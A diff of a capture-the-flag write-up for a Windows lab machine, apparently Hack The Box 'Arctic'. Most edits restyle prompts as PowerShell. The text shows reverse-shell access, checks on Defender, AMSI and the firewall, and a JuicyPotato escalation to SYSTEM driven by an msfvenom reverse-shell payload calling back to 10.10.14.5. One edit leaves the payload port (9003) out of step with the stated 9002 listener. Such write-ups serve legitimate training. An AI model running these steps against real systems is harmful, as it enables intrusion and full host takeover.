@@ -236,10 +236,12 @@ connect to [10.10.14.5] from (UNKNOWN) [10.10.10.11] 49185
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
-C:\ColdFusion8\runtime\bin>
+PS C:\ColdFusion8\runtime\bin>
 ```
 
 It successfully caught the reverse shell. Nice!
+
+It's a standard one though, so I'll transform it into a Powershell session.
 
 # Local enumeration
 
@@ -249,8 +251,8 @@ If we run `whoami`, we see that we got a foothold as `tolis`.
 
 Let's gather some information about the Windows version of Arctic.
 
-```cmd
-C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+```ps1
+PS C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
 ```
 
 ```
@@ -260,8 +262,8 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 
 Okay, so this is Windows Server 2008!
 
-```cmd
-C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+```ps1
+PS C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
 ```
 
 ```
@@ -277,8 +279,8 @@ This version of Windows is a bit old, and maybe there are missing hotfixes. We'l
 
 What is Arctic's architecture?
 
-```cmd
-C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
+```ps1
+PS C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
 ```
 
 ```
@@ -292,8 +294,8 @@ So this system is using x64. This will be useful to know if we want to compile o
 
 Let's check if Windows Defender is enabled.
 
-```cmd
-C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
+```ps1
+PS C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
 ```
 
 There's no output, which probably means that we got an error. Let's assume it's disabled then!
@@ -302,8 +304,8 @@ There's no output, which probably means that we got an error. Let's assume it's 
 
 Let's check if there's any AMSI provider.
 
-```cmd
-C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
+```ps1
+PS C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
 ```
 
 As for Windows Defender, there's no output.
@@ -312,8 +314,8 @@ As for Windows Defender, there's no output.
 
 Let's see which Windows Firewall policies profiles are enabled.
 
-```cmd
-C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
+```ps1
+PS C:\ColdFusion8\runtime\bin> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
 ```
 
 ```
@@ -335,8 +337,8 @@ Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression 
 
 Let's gather the list of connected NICs.
 
-```cmd
-C:\ColdFusion8\runtime\bin> ipconfig /all
+```ps1
+PS C:\ColdFusion8\runtime\bin> ipconfig /all
 ```
 
 ```
@@ -386,8 +388,8 @@ Looks like there's a single network.
 
 Let's enumerate all local users using `PowerView`.
 
-```cmd
-C:\ColdFusion8\runtime\bin> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table"
+```ps1
+PS C:\ColdFusion8\runtime\bin> Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table
 ```
 
 ```
@@ -402,8 +404,8 @@ It looks like there's only us, `tolis`.
 
 Let's enumerate all local groups, once again using `PowerView`.
 
-```cmd
-C:\ColdFusion8\runtime\bin> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096"
+```ps1
+PS C:\ColdFusion8\runtime\bin> Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096
 ```
 
 ```
@@ -433,8 +435,8 @@ Looks classic.
 
 Let's gather more information about us.
 
-```cmd
-C:\ColdFusion8\runtime\bin> net user tolis
+```ps1
+PS C:\ColdFusion8\runtime\bin> net user tolis
 ```
 
 ```
@@ -471,8 +473,8 @@ We don't belong to interesting groups.
 
 If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.
 
-```cmd
-C:\ColdFusion8\runtime\bin> type C:\Users\tolis\Desktop\user.txt
+```ps1
+PS C:\ColdFusion8\runtime\bin> type $env:USERPROFILE\Desktop\user.txt
 ```
 
 ```
@@ -491,8 +493,8 @@ Let's now focus on our tokens.
 
 Which security groups are associated with our access tokens?
 
-```cmd
-C:\ColdFusion8\runtime\bin> whoami /groups
+```ps1
+PS C:\ColdFusion8\runtime\bin> whoami /groups
 ```
 
 ```
@@ -516,8 +518,8 @@ Unfortunately, there's nothing that we can abuse.
 
 What about the privileges associated with our access tokens?
 
-```cmd
-C:\ColdFusion8\runtime\bin> whoami /priv
+```ps1
+PS C:\ColdFusion8\runtime\bin> whoami /priv
 ```
 
 ```
@@ -544,16 +546,16 @@ Let's download a binary of `JuicyPotato`, which we can find [here](https://githu
 
 Once this is done, the next step is to transfer the binary to Arctic.
 
-```cmd
-C:\ColdFusion8\runtime\bin> copy \\10.10.14.5\server\juicy_potato.exe C:\tmp\juicy_potato.exe
+```ps1
+PS C:\ColdFusion8\runtime\bin> copy \\10.10.14.5\server\juicy_potato.exe C:\tmp\juicy_potato.exe
 ```
 
-Alright, so the exploit is on Arctic.
+Alright, so the exploit is now on Arctic.
 
 We still need to decide which command we want to execute with this exploit. My goal is to obtain another reverse shell, so I'll setup a listener on port `9002` and I'll use `msfvenom` to create an executable:
 
 ```sh
-❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9002 -f exe > /workspace/server/revshell.exe
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9003 -f exe > /workspace/server/revshell.exe
 ```
 
 Let's transfer it to Arctic using the same method as for `juicy_potato.exe`.
@@ -564,8 +566,8 @@ Now we should be ready to go!
 
 Time to use this binary to execute our `revshell.exe` executable as `NT AUTHORITY\SYSTEM`!
 
-```cmd
-C:\ColdFusion8\runtime\bin> C:\tmp\juicy_potato.exe -l 1337 -p C:\tmp\revshell.exe -t *
+```ps1
+PS C:\ColdFusion8\runtime\bin> C:\tmp\juicy_potato.exe -l 1337 -p C:\tmp\revshell.exe -t *
 ```
 
 And on our listener...
@@ -578,7 +580,11 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>
 ```
 
-It caught the reverse shell! If we run `whoami`, we can confirm that we are indeed `NT AUTHORITY\SYSTEM`.
+It caught the reverse shell!
+
+It's a standard one though, so I'll transform it into a Powershell session.
+
+If we run `whoami`, we can confirm that we are indeed `NT AUTHORITY\SYSTEM`.
 
 # Local enumeration
 
@@ -588,8 +594,8 @@ The only thing we need to do to finish this box is to retrieve the root flag.
 
 And as usual, we can find it on our Desktop!
 
-```cmd
-C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+```ps1
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ```
